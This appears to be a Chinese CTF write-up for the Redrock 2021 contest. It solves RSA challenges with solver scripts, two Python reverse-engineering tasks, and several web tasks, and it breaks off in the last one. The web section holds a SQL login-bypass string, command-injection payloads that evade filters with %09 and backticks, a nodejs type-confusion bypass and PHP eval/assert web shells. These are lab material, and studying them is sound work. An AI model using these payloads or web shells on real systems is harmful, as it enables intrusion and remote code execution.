<p>题目给出n,e,c，n很大无法求解，但是e=3，根据网上的脚本修改一下，原文链接<a href="https://blog.csdn.net/m0_46230316/article/details/105904020%EF%BC%8C%EF%BC%88%E4%BD%BF%E7%94%A8kali%E7%9A%84python3%EF%BC%8C%E5%90%A6%E5%88%99%E4%BC%9A%E9%81%87%E5%88%B0%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E9%97%AE%E9%A2%98%EF%BC%89">https://blog.csdn.net/m0_46230316/article/details/105904020，（使用kali的python3，否则会遇到第三方库问题）</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment">#读入公钥</span></span><br><span class="line">n=<span class="number">12193165491232590150686982432557244804300750963175008178236581194544171828897340736916176149173721551510190319108772113575377325860653421908067617797675141336620007755973554040917786258089348023269695843501039718996399429207128831592342485274073559355787675660026139594401556004887413636861987542041178448038883087652407784191872220121749480825916533097977902472760860392352675957455292246566059496154702620024668875067749860935756039381451038144741567698966832403739607807494155714430462171863146787192405435943867107310410641010836155850842469201306161627801130957327434956927373515462512612188696131269636192461423</span></span><br><span class="line">e=<span class="number">3</span></span><br><span class="line"></span><br><span class="line">cipher=<span class="number">56274920108033865750489777368888541889198069509823093691274482837635646820708448835557485368595293642574121944177628195579346614966976511404731963826581810789</span></span><br><span class="line"><span class="comment">#破解密文</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag_for</span>():</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">1000</span>):</span><br><span class="line">        <span class="keyword">if</span>(gmpy2.iroot(cipher+x*n, <span class="number">3</span>)[<span class="number">1</span>] == <span class="number">1</span>):</span><br><span class="line">            flag_bin = <span class="built_in">int</span>(gmpy2.iroot(cipher+x*n, <span class="number">3</span>)[<span class="number">0</span>])</span><br><span class="line">            flag = <span class="built_in">hex</span>(flag_bin)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    get_flag_for()</span><br></pre></td></tr></table></figure>

<p>输出为0x666c61677b333333333333333333333333333333337d，网上十六进制转字符串得到flag{3333333333333333}。</p>
<h3 id="rsa4-txt："><a href="#rsa4-txt：" class="headerlink" title="rsa4.txt："></a>rsa4.txt：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n=21986952806083130275797030452868092210388137103595814788381248228107929558485767818149518117932024450374044287378157581547697424876342510478383269724874135655601388068311221551534992774719985788098089299398773525516314130692671612649055459290980711341053921160651223628975025276916068562487276949413795212067701663409252958915147001221841172575522092200851913186869160247427103350875050014227644172312145910978929739518600818119553066877138825546574926506980419695756570336121367807763597790159805982689429185389067077219495106100710784490003787384470363349515390928245929021470777491993247675208476744147539290542079</span><br><span class="line">c1=19080248060395956258595761702947616837845588617755473350164848608342896192096153766636446745996441248489138669909312704510100023041719293226643189161115835169792601166507228976449653758104221391373739283287111822100404959444656989209298869233682959519894228445823327423567340477044957250173135570732119519514748886862820859599682230290582445164104163511283624763746454074599408411149918612416364297711010755249065480951982199240945165446483677476161636684768270379606205026152728934312464010098356523544157286362743965107295358880266461974959052414218649596046837104787152236254856919540215279775538232015374683149314</span><br><span class="line">e1=65537</span><br><span class="line">c2=815171555665326899982661281481001390064300856919888083250806172710060128291404752125745860158654623934730369530712293057821113559181932956426529753288962369982748766307770012110610668495343425466815317018724595581695188071853123666496156127491306080738281779564122698898763159503716584945082612066934572740584767539989365707874144555109550001742456541396584317369661215991373364014507792917227689605854637586858176708733723691714146834508176539926763094301068008238636820662873240589975489818974137940437378903499689011565143784449867096013660271045425149498398024889683370620521234304474702542771113251819984463783</span><br><span class="line">e2=257</span><br></pre></td></tr></table></figure>

<p>题目给出一个n，两个c,两个e,可以用共模攻击，原文链接：<a href="https://www.cnblogs.com/P201521440001/p/11439344.html%EF%BC%8C%E5%B0%86%E6%95%B0%E6%8D%AE%E8%A1%A5%E4%B8%8A%E8%BF%90%E8%A1%8C%E5%8D%B3%E5%8F%AF%E3%80%82">https://www.cnblogs.com/P201521440001/p/11439344.html，将数据补上运行即可。</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  n = <span class="number">21986952806083130275797030452868092210388137103595814788381248228107929558485767818149518117932024450374044287378157581547697424876342510478383269724874135655601388068311221551534992774719985788098089299398773525516314130692671612649055459290980711341053921160651223628975025276916068562487276949413795212067701663409252958915147001221841172575522092200851913186869160247427103350875050014227644172312145910978929739518600818119553066877138825546574926506980419695756570336121367807763597790159805982689429185389067077219495106100710784490003787384470363349515390928245929021470777491993247675208476744147539290542079</span></span><br><span class="line">  c1 = <span class="number">19080248060395956258595761702947616837845588617755473350164848608342896192096153766636446745996441248489138669909312704510100023041719293226643189161115835169792601166507228976449653758104221391373739283287111822100404959444656989209298869233682959519894228445823327423567340477044957250173135570732119519514748886862820859599682230290582445164104163511283624763746454074599408411149918612416364297711010755249065480951982199240945165446483677476161636684768270379606205026152728934312464010098356523544157286362743965107295358880266461974959052414218649596046837104787152236254856919540215279775538232015374683149314</span></span><br><span class="line">  c2 = <span class="number">815171555665326899982661281481001390064300856919888083250806172710060128291404752125745860158654623934730369530712293057821113559181932956426529753288962369982748766307770012110610668495343425466815317018724595581695188071853123666496156127491306080738281779564122698898763159503716584945082612066934572740584767539989365707874144555109550001742456541396584317369661215991373364014507792917227689605854637586858176708733723691714146834508176539926763094301068008238636820662873240589975489818974137940437378903499689011565143784449867096013660271045425149498398024889683370620521234304474702542771113251819984463783</span></span><br><span class="line">  e1 = <span class="number">65537</span></span><br><span class="line">  e2 = <span class="number">257</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line">  <span class="built_in">print</span> (<span class="built_in">hex</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br></pre></td></tr></table></figure>

<p>得到0x666c61677b436f6d6d6f6e5f4d6f64756c75735f41747461636b7d，在线十六进制转字符串，最后结果flag{Common_Modulus_Attack}</p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="easy-py："><a href="#easy-py：" class="headerlink" title="easy_py："></a>easy_py：</h3><p>题目地址：<a href="https://www.lanzouw.com/iNYNTwvaa5i">https://www.lanzouw.com/iNYNTwvaa5i</a><br>密码:2ktr</p>
<p>拿到手是python图标封装的exe文件，使用pyinstxtractor解包，在exe_extracted里面没有找到main文件，PYZ-00.pyz_extracted为空，主目录下有python.pyc和struct.pyc，使用uncompyle还原pyc文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> D:\文档&gt; uncompyle6 .\struct.pyc</span><br><span class="line"><span class="comment"># uncompyle6 version 3.8.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.9.0 (3425)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.7.4 (tags/v3.7.4:e09359112e, Jul  8 2019, 20:34:20) [MSC v.1916 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: struct.py</span></span><br><span class="line"><span class="comment"># Compiled at: 1995-09-28 00:18:56</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 272 bytes</span></span><br><span class="line"></span><br><span class="line">Unsupported Python version, <span class="number">3.9</span>.<span class="number">0</span>, <span class="keyword">for</span> decompilation</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Unsupported bytecode in file .\struct.pyc</span></span><br><span class="line"><span class="comment"># Unsupported Python version, 3.9.0, for decompilation</span></span><br></pre></td></tr></table></figure>

<p>不支持python3.9平台反编译，使用xxd查看python.pyc文件二进制数据，有很类似flag的字符串</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">000002f0: 094e e905 0000 007a 0566 6c61 677b e9ff  .N.....z.flag&#123;..</span><br><span class="line">00000300: ffff ffda 017d 7a19 5039 7448 306e 5f31  .....&#125;z.P9tH0n_1</span><br><span class="line">00000310: 5f6c 3076 405f 3930 755f 3530 5f6d 7543  _l0v@_90u_50_muC</span><br><span class="line">00000320: 687a 0850 6572 6665 6374 217a 1b47 6f6f  hz.Perfect!z.Goo</span><br></pre></td></tr></table></figure>

<p>直接运行easy_py.exe，输入猜测的flag{P9tH0n_1_l0v@_90u_50_muChz}，显示good但是不完美，根据flag内容猜测语义python i love you so much，去掉z，flag{P9tH0n_1_l0v@_90u_50_muCh}成功。</p>
<h3 id="cythonic："><a href="#cythonic：" class="headerlink" title="cythonic："></a>cythonic：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 3           0 LOAD_GLOBAL              0 (input)</span><br><span class="line">             2 LOAD_CONST               1 (&#x27;EasyEasyEasy!&#x27;)</span><br><span class="line">             4 CALL_FUNCTION            1</span><br><span class="line">             6 STORE_FAST               0 (usr_flag)</span><br><span class="line"></span><br><span class="line"> 4           8 LOAD_GLOBAL              1 (len)</span><br><span class="line">            10 LOAD_FAST                0 (usr_flag)</span><br><span class="line">            12 CALL_FUNCTION            1</span><br><span class="line">            14 LOAD_CONST               2 (48)</span><br><span class="line">            16 COMPARE_OP               3 (!=)</span><br><span class="line">            18 POP_JUMP_IF_FALSE       28</span><br><span class="line"></span><br><span class="line"> 5          20 LOAD_GLOBAL              2 (exit)</span><br><span class="line">            22 LOAD_CONST               3 (77777)</span><br><span class="line">            24 CALL_FUNCTION            1</span><br><span class="line">            26 POP_TOP</span><br><span class="line"></span><br><span class="line"> 6     &gt;&gt;   28 LOAD_CONST               4 (187)</span><br><span class="line">            30 LOAD_CONST               4 (187)</span><br><span class="line">            32 LOAD_CONST               5 (174)</span><br><span class="line">            34 LOAD_CONST               6 (145)</span><br><span class="line">            36 LOAD_CONST               7 (207)</span><br><span class="line">            38 LOAD_CONST               8 (175)</span><br><span class="line">            40 LOAD_CONST               9 (194)</span><br><span class="line">            42 LOAD_CONST              10 (133)</span><br><span class="line">            44 LOAD_CONST              11 (181)</span><br><span class="line">            46 LOAD_CONST              12 (160)</span><br><span class="line">            48 LOAD_CONST              13 (201)</span><br><span class="line">            50 LOAD_CONST              14 (180)</span><br><span class="line">            52 LOAD_CONST              11 (181)</span><br><span class="line">            54 LOAD_CONST              15 (225)</span><br><span class="line">            56 LOAD_CONST              16 (168)</span><br><span class="line">            58 LOAD_CONST              17 (195)</span><br><span class="line">            60 LOAD_CONST              18 (217)</span><br><span class="line">            62 LOAD_CONST              19 (166)</span><br><span class="line">            64 LOAD_CONST              20 (135)</span><br><span class="line">            66 LOAD_CONST              21 (163)</span><br><span class="line">            68 LOAD_CONST              22 (219)</span><br><span class="line">            70 LOAD_CONST              23 (143)</span><br><span class="line">            72 LOAD_CONST              24 (134)</span><br><span class="line"></span><br><span class="line"> 7          74 LOAD_CONST              14 (180)</span><br><span class="line">            76 LOAD_CONST              25 (190)</span><br><span class="line">            78 LOAD_CONST              26 (255)</span><br><span class="line">            80 LOAD_CONST              27 (155)</span><br><span class="line">            82 LOAD_CONST              28 (156)</span><br><span class="line">            84 LOAD_CONST              29 (243)</span><br><span class="line">            86 LOAD_CONST              30 (252)</span><br><span class="line">            88 LOAD_CONST              31 (158)</span><br><span class="line">            90 LOAD_CONST              32 (233)</span><br><span class="line">            92 LOAD_CONST              33 (130)</span><br><span class="line">            94 LOAD_CONST              34 (153)</span><br><span class="line">            96 LOAD_CONST              35 (235)</span><br><span class="line">            98 LOAD_CONST              36 (230)</span><br><span class="line">           100 LOAD_CONST               4 (187)</span><br><span class="line">           102 LOAD_CONST              37 (204)</span><br><span class="line">           104 LOAD_CONST              38 (239)</span><br><span class="line">           106 LOAD_CONST              39 (205)</span><br><span class="line">           108 LOAD_CONST              40 (176)</span><br><span class="line">           110 LOAD_CONST              41 (147)</span><br><span class="line">           112 LOAD_CONST              42 (144)</span><br><span class="line">           114 LOAD_CONST              43 (248)</span><br><span class="line">           116 LOAD_CONST               4 (187)</span><br><span class="line">           118 LOAD_CONST              44 (186)</span><br><span class="line">           120 LOAD_CONST              45 (254)</span><br><span class="line">           122 LOAD_CONST              30 (252)</span><br><span class="line"></span><br><span class="line"> 6         124 BUILD_LIST              48</span><br><span class="line">           126 STORE_FAST               1 (ints)</span><br><span class="line"></span><br><span class="line"> 9         128 LOAD_GLOBAL              3 (list)</span><br><span class="line">           130 LOAD_GLOBAL              4 (map)</span><br><span class="line">           132 LOAD_GLOBAL              5 (ord)</span><br><span class="line">           134 LOAD_GLOBAL              3 (list)</span><br><span class="line">           136 LOAD_CONST              46 (&#x27;https://space.bilibili.com/672328094&#x27;)</span><br><span class="line">           138 CALL_FUNCTION            1</span><br><span class="line">           140 CALL_FUNCTION            2</span><br><span class="line">           142 CALL_FUNCTION            1</span><br><span class="line">           144 STORE_FAST               2 (digits)</span><br><span class="line"></span><br><span class="line">11         146 BUILD_LIST               0</span><br><span class="line">           148 STORE_FAST               3 (key)</span><br><span class="line"></span><br><span class="line">12         150 LOAD_FAST                3 (key)</span><br><span class="line">           152 LOAD_METHOD              6 (append)</span><br><span class="line">           154 LOAD_CONST              47 (&#x27;y&#x27;)</span><br><span class="line">           156 CALL_METHOD              1</span><br><span class="line">           158 POP_TOP</span><br><span class="line"></span><br><span class="line">13         160 LOAD_FAST                3 (key)</span><br><span class="line">           162 LOAD_METHOD              6 (append)</span><br><span class="line">           164 LOAD_CONST              48 (&#x27;b&#x27;)</span><br><span class="line">           166 CALL_METHOD              1</span><br><span class="line">           168 POP_TOP</span><br><span class="line"></span><br><span class="line">14         170 LOAD_FAST                3 (key)</span><br><span class="line">           172 LOAD_METHOD              6 (append)</span><br><span class="line">           174 LOAD_CONST              48 (&#x27;b&#x27;)</span><br><span class="line">           176 CALL_METHOD              1</span><br><span class="line">           178 POP_TOP</span><br><span class="line"></span><br><span class="line">16         180 BUILD_LIST               0</span><br><span class="line">           182 STORE_FAST               4 (Hai)</span><br><span class="line"></span><br><span class="line">17         184 LOAD_GLOBAL              7 (enumerate)</span><br><span class="line">           186 LOAD_FAST                0 (usr_flag)</span><br><span class="line">           188 CALL_FUNCTION            1</span><br><span class="line">           190 GET_ITER</span><br><span class="line">       &gt;&gt;  192 FOR_ITER                50 (to 244)</span><br><span class="line">           194 UNPACK_SEQUENCE          2</span><br><span class="line">           196 STORE_FAST               5 (i)</span><br><span class="line">           198 STORE_FAST               6 (j)</span><br><span class="line"></span><br><span class="line">18         200 LOAD_FAST                4 (Hai)</span><br><span class="line">           202 LOAD_METHOD              6 (append)</span><br><span class="line"></span><br><span class="line">19         204 LOAD_GLOBAL              5 (ord)</span><br><span class="line">           206 LOAD_FAST                6 (j)</span><br><span class="line">           208 CALL_FUNCTION            1</span><br><span class="line">           210 LOAD_GLOBAL              5 (ord)</span><br><span class="line">           212 LOAD_FAST                3 (key)</span><br><span class="line">           214 LOAD_FAST                5 (i)</span><br><span class="line">           216 LOAD_CONST              49 (3)</span><br><span class="line">           218 BINARY_MODULO</span><br><span class="line">           220 BINARY_SUBSCR</span><br><span class="line">           222 CALL_FUNCTION            1</span><br><span class="line">           224 BINARY_ADD</span><br><span class="line"></span><br><span class="line">20         226 LOAD_FAST                2 (digits)</span><br><span class="line">           228 LOAD_FAST                5 (i)</span><br><span class="line">           230 LOAD_CONST              50 (36)</span><br><span class="line">           232 BINARY_MODULO</span><br><span class="line">           234 BINARY_SUBSCR</span><br><span class="line"></span><br><span class="line">19         236 BINARY_XOR</span><br><span class="line"></span><br><span class="line">18         238 CALL_METHOD              1</span><br><span class="line">           240 POP_TOP</span><br><span class="line">           242 JUMP_ABSOLUTE          192</span><br><span class="line"></span><br><span class="line">22     &gt;&gt;  244 LOAD_FAST                4 (Hai)</span><br><span class="line">           246 LOAD_FAST                1 (ints)</span><br><span class="line">           248 COMPARE_OP               2 (==)</span><br><span class="line">           250 EXTENDED_ARG             1</span><br><span class="line">           252 POP_JUMP_IF_FALSE      262</span><br><span class="line"></span><br><span class="line">23         254 LOAD_GLOBAL              8 (print)</span><br><span class="line">           256 LOAD_CONST              51 (&#x27;WelCome&#x27;)</span><br><span class="line">           258 CALL_FUNCTION            1</span><br><span class="line">           260 POP_TOP</span><br><span class="line">       &gt;&gt;  262 LOAD_CONST               0 (None)</span><br><span class="line">           264 RETURN_VALUE</span><br></pre></td></tr></table></figure>

<p>根据题目提示，要用到python的dis库，就是根据dis.dis()的输出来还原python的源代码，最右侧是源代码含有的一部分数据，第一列是行数，第三列类似助记符，虽然没有完全成功还原源代码(cythonic中有GET_IETR和FOR_IETR助记符，但是却没有ＳＥＴＵＰ＿ＬＯＯＰ助记符，不知道本来就是这样还是缺失了，我这补了一个ｆｏｒ循环多了一个ＳＥＴＵＰ＿ＬＯＯＰ)，但是能够大概的还原源代码的样子。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span>():</span></span><br><span class="line">    usr_flag=<span class="built_in">input</span>(<span class="string">&#x27;EasyEasyEasy!&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">len</span>(usr_flag)!=<span class="number">48</span>):</span><br><span class="line">        exit(<span class="number">77777</span>)</span><br><span class="line">    ints=[<span class="number">187</span>,<span class="number">187</span>,<span class="number">174</span>,<span class="number">145</span>,<span class="number">207</span>,<span class="number">175</span>,<span class="number">194</span>,<span class="number">133</span>,<span class="number">181</span>,<span class="number">160</span>,<span class="number">201</span>,<span class="number">180</span>,<span class="number">181</span>,<span class="number">225</span>,<span class="number">168</span>,<span class="number">195</span>,<span class="number">217</span>,<span class="number">166</span>,<span class="number">135</span>,<span class="number">163</span>,<span class="number">219</span>,<span class="number">143</span>,<span class="number">134</span>,\</span><br><span class="line">          <span class="number">180</span>,<span class="number">190</span>,<span class="number">255</span>,<span class="number">155</span>,<span class="number">156</span>,<span class="number">243</span>,<span class="number">252</span>,<span class="number">158</span>,<span class="number">233</span>,<span class="number">130</span>,<span class="number">153</span>,<span class="number">235</span>,<span class="number">230</span>,<span class="number">187</span>,<span class="number">204</span>,<span class="number">239</span>,<span class="number">205</span>,<span class="number">176</span>,<span class="number">147</span>,<span class="number">144</span>,<span class="number">248</span>,<span class="number">187</span>,<span class="number">186</span>,<span class="number">254</span>,<span class="number">252</span>]</span><br><span class="line">    </span><br><span class="line">    digits=<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>,<span class="built_in">list</span>(<span class="string">&#x27;https://space.bilibili.com/672328094&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">    key=[]</span><br><span class="line">    key.append(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    key.append(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    key.append(<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    Hai=[]</span><br><span class="line">    <span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">enumerate</span>(usr_flag):</span><br><span class="line">        Hai.append((<span class="built_in">ord</span>(j)+<span class="built_in">ord</span>(key[i%<span class="number">3</span>]))^(digits[ i%<span class="number">36</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> Hai==ints:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;WelCome&#x27;</span>)</span><br><span class="line"></span><br><span class="line">dis.dis(hello)</span><br><span class="line"><span class="comment">#hello()</span></span><br></pre></td></tr></table></figure>

<p>还原源代码后，根据加密那一块的加密方式写出解密的方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> disdef hello():    <span class="comment">#usr_flag=input(&#x27;EasyEasyEasy!&#x27;)    #if (len(usr_flag)!=48):    #    exit(77777)    usr_flag=[str((i%10)) for i in range(48)]    usr_flag=&#x27;&#x27;.join(usr_flag)    print(usr_flag)    ints=[187,187,174,145,207,175,194,133,181,160,201,180,181,225,168,195,217,166,135,163,219,143,134,\          180,190,255,155,156,243,252,158,233,130,153,235,230,187,204,239,205,176,147,144,248,187,186,254,252]        digits=list(map(ord,list(&#x27;https://space.bilibili.com/672328094&#x27;)))    key=[]    key.append(&#x27;y&#x27;)    key.append(&#x27;b&#x27;)    key.append(&#x27;b&#x27;)        Hai=[]    for i,j in enumerate(usr_flag):        #Hai.append((ord(j)+ord(key[i%3]))^(digits[ i%36]))        Hai.append((ints[i]^digits[i%36])-ord(key[i%3]))    if Hai==ints:        print(&#x27;WelCome&#x27;)    for a in Hai:        print(chr(a),end=&#x27;&#x27;)#dis.dis(hello)hello()</span></span><br></pre></td></tr></table></figure>

<p>得出来是一个加密后的编码ZmxhZ3tHdWFuWmh1SmlhUmFuX0R1bl4yX0ppZV9DaGFufQ==，base64解密得到flag：flag{GuanZhuJiaRan_Dun^2_Jie_Chan}。</p>
<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="我要黑了红岩网校："><a href="#我要黑了红岩网校：" class="headerlink" title="我要黑了红岩网校："></a>我要黑了红岩网校：</h3><p>打开御剑，目录扫描，有个robots.txt，访问就是flag。</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/redrock-wp-2021/image-20211124233218128.png" alt="image-20211124233218128"></p>
<h3 id="卷卷的backdoor："><a href="#卷卷的backdoor：" class="headerlink" title="卷卷的backdoor："></a>卷卷的backdoor：</h3><p>go语言源码</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line">	r.GET(<span class="string">&quot;/&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">		c.String(http.StatusOK, <span class="string">&quot;上周在红岩网校后端学习了如何使用golang写gin应用，这是我第一次写web网页，不知道会不会出什么问题，好紧张！！&quot;</span>)</span><br><span class="line">	&#125;)</span><br><span class="line">	r.PUT(<span class="string">&quot;/hacked-by-yyz-from-sre&quot;</span>, backdoor)</span><br><span class="line">	err := r.Run(<span class="string">&quot;:8080&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">backdoor</span><span class="params">(c *gin.Context)</span></span>  &#123;</span><br><span class="line">	f, err := ioutil.ReadFile(<span class="string">&quot;/flag&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	c.String(<span class="number">200</span>, fmt.Sprintf(<span class="string">&quot;%s&quot;</span>, <span class="keyword">string</span>(f)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下载附件，分析源码，发现有GET和PUT两种方法，get访问显示正常，put访问/hacked-by-yyz-from-sre应该就会调用backdoor然后显示flag，打开burpsuite，抓包，发送到repeater，修改包数据，访问即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PUT /hacked-by-yyz-from-sre HTTP/1.1Host: 928cc5cc-f8d3-4e90-87d3-b7cc9e2406db.ctf.redrock.teamUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: -----------------------------------(使用自己的cookie)Upgrade-Insecure-Requests: 1Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>

<p>最后出现redrock{3abcfa3d-a5c5-4790-9264-a4c897189be3}。</p>
<h3 id="ez-exec："><a href="#ez-exec：" class="headerlink" title="ez_exec："></a>ez_exec：</h3><p>首先用万能密码绕过，登录进去，账户admin,密码”or”=”a’=’a，发现是个命令执行，发现可以用ls,但是过滤了空格，cat,nl,more等命令，空格最后发现可以用%09绕过，less没有过滤可以用less查看文件。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=/ping.php?ip=127.0.0.1;less%09ping.php;</span><br></pre></td></tr></table></figure>

<p>发现ping.php源码，过滤了flag字符串,进入根目录发现flag，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ping.php?ip=127.0.0.1;cd%09../../../../../;ls;</span><br></pre></td></tr></table></figure>

<p>但是flag被过滤，可以使用反引号，输出的内容作为输入绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload=/ping.php?ip=127.0.0.1;cd%09../../../../../;ls;less%09`ls`;</span><br></pre></td></tr></table></figure>

<p>最后出现flag:redrock{45a27061-e33f-43e4-a750-b96309c9172c}。</p>
<h3 id="easynodejs："><a href="#easynodejs：" class="headerlink" title="easynodejs："></a>easynodejs：</h3><p>查看页面源代码，最后一行<!--visit /source can get source code-->，下载文件查看源代码</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/redrock-wp-2021/image-20211125102957237.png" alt="image-20211125102957237"></p>
<p>有关键代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (username !== &#x27;admin&#x27; &amp;&amp; username == &#x27;admin&#x27; &amp;&amp; password == &quot;admin&quot;) &#123;        message = &#x27;login success!! flag is &#x27; + flag;    &#125;</span><br></pre></td></tr></table></figure>

<p>nodejs的弱类型。打开burp，修改数据包，发送</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username[0]=admin&amp;password=admin</span><br></pre></td></tr></table></figure>

<p>最后得到flag：redrock{b5ed9cab-ed27-4f1a-bfb5-4ad53802d755}。</p>
<h3 id="myshopxo："><a href="#myshopxo：" class="headerlink" title="myshopxo："></a>myshopxo：</h3><p>使用目录扫描，有个robots.txt，发现有个<a href="http://www.zip,直接访问下载源码,使用php代码审计工具rips,发现/application/index/view/lengyu/index/star.php%EF%BC%8C%E5%86%85%E5%AE%B9%E6%98%AF">www.zip，直接访问下载源码，使用php代码审计工具rips，发现/application/index/view/lengyu/index/star.php，内容是</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ec ho md5(<span class="number">1</span>);@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure>

<p>使用蚁剑连接，登录成功，发现可以在当前目录下创建文件，但是使用系统命令失败，新建一个php马。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @assert(<span class="variable">$_REQUEST</span>[<span class="string">&quot;password&quot;</span>]); <span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>GET执行查看到phpinfo()的信息，根据提示绕过df，网上找了一个php探针的脚本，发现禁用一大堆函数。</p>
<p>php 探针</p>
